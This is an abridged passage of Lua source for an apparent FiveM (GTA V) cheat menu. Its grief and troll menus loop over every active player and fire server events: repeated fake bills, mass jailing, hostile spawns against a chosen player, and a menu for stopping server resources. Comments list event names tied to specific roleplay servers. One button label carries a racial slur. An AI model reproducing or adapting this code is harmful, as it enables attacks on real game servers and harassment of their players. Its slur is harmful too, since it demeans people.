...
local function MenuRuntimeThread()
	...
	CKgangisontopmyfriend.CreateSubMenu("LocalThrownWeapons", "LocalWepCategory", "Thrown Weapons")
	...
	CKgangisontopmyfriend.CreateSubMenu("StopperResources", "ServerMenu", "Stop Resources")
	--CKgangisontopmyfriend.CreateSubMenu('ResourceData', "StopperResources", "Resource Data")
	...
	while isMenuEnabled do
		...
		elseif CKgangisontopmyfriend.IsMenuOpened("SelfMenu") then
			...
			if CKgangisontopmyfriend.Button("~g~ESX ~s~| ~s~Ambulance Revive ~m~(~r~!~m~)", "~g~Native") then
		...
		elseif CKgangisontopmyfriend.IsMenuOpened("GriefMenu") then
			...
			if CKgangisontopmyfriend.Button("~o~Particle ~s~All", '~r~Server') then
				for i = 0, 255 do
					if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
					if NetworkIsPlayerActive(i) then
			...
			if CKgangisontopmyfriend.Button("~o~Faktury ~s~All", '~r~Server') then
				local label = math.random(1, 1000)
				local amount = math.random(50000, 80000)
				local society = "society_mechanic"
				local society2 = "society_police"
				local pocet = 10
				while pocet > 0 do
					for i = 0, 255 do
						if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
						if NetworkIsPlayerActive(i) then
						-- CloudRP esx_biAhojJsemGayTesiMelling:sendBill
						-- LSRP esx_biASJdkjaawI566gfdlling:sendBill

						TriggerServerEvent('esx_biAhojJsemGayTesiMelling:sendBill', GetPlayerServerId(i), society, label, amount)
						TriggerServerEvent('esx_biAhojJsemGayTesiMelling:sendBill', GetPlayerServerId(i), society2, "DarkFivem pozdravuje: ", label, amount)
                    	end
					end
					Wait(1000)
					pocet = pocet -1
			...
			if CKgangisontopmyfriend.Button("~o~Ped ~s~All", '~r~Server') then
				for i = 0, 255 do
					if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
					if NetworkIsPlayerActive(i) then
			...
			if CKgangisontopmyfriend.Button("~o~Jail ~s~All", '~r~Server') then
					local jailTime = math.random(30, 100)
					for i = 0, 255 do
						if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
						if NetworkIsPlayerActive(i) then
							-- CloudRP esx_jaAhojJsemGayTesiMeil:sendToJail
							-- LSRP esx-qalle-jail:jailPASJdkjaawI566gfdlayerme
							TriggerServerEvent("esx-qalle-jail:jailPASJdkjaawI566gfdlayerme", GetPlayerServerId(i), jailTime, "DarkFivem Welcome")
		...
		elseif CKgangisontopmyfriend.IsMenuOpened("LocalWepCategory") then
			...
			CKgangisontopmyfriend.MenuButton("Thrown Weapons", "LocalThrownWeapons")
		...
		elseif CKgangisontopmyfriend.IsMenuOpened("LocalHeavyWeapons") then
			...
			CKgangisontopmyfriend.Display()
		elseif CKgangisontopmyfriend.IsMenuOpened("LocalThrownWeapons") then
			for i = 1, #t_Weapons do
		...
		elseif CKgangisontopmyfriend.IsMenuOpened("ServerMenu") then
			...
			if CKgangisontopmyfriend.MenuButton("Resource Stop", "StopperResources") then end
		...
		elseif CKgangisontopmyfriend.IsMenuOpened("MenuSettingsCredits") then
			...
			CKgangisontopmyfriend.Display()
		elseif CKgangisontopmyfriend.IsMenuOpened("StopperResources") then
			for i = 0, #Get_Res do
				local resource = Get_Res[i]
				...
				if CKgangisontopmyfriend.Button(resource, status) then
		...
		elseif CKgangisontopmyfriend.IsMenuOpened("PlayerOptionsMenu") then
			...
			if CKgangisontopmyfriend.Button("~o~Control", '~g~Native') then
		...
		elseif CKgangisontopmyfriend.IsMenuOpened("OnlineTrollMenu") then
			...
			if CKgangisontopmyfriend.Button("Spawn Enemy(AK)") then
				spawnEnemies(GetPlayerPed(SelectedPlayer), 'a_m_y_skater_01')
			end

			if CKgangisontopmyfriend.Button("Spawn Enemy(RPG)") then
				spawnEnemies(GetPlayerPed(SelectedPlayer), 'a_m_y_skater_01')
			end

			if CKgangisontopmyfriend.Button("ECHO Army") then
				spawnEnemies(GetPlayerPed(SelectedPlayer), 'mp_f_freemode_01')
			end

			if CKgangisontopmyfriend.Button("Spawn Enemy(Molotov)") then
				spawnEnemies(GetPlayerPed(SelectedPlayer), 'mp_f_freemode_01')
			end

			if CKgangisontopmyfriend.Button("Hair(RED Nigga)") then
		...
		elseif CKgangisontopmyfriend.IsMenuOpened("ESXMenuPlayer") then
			...
			elseif CKgangisontopmyfriend.Button("~g~ESX ~s~Jail player") then
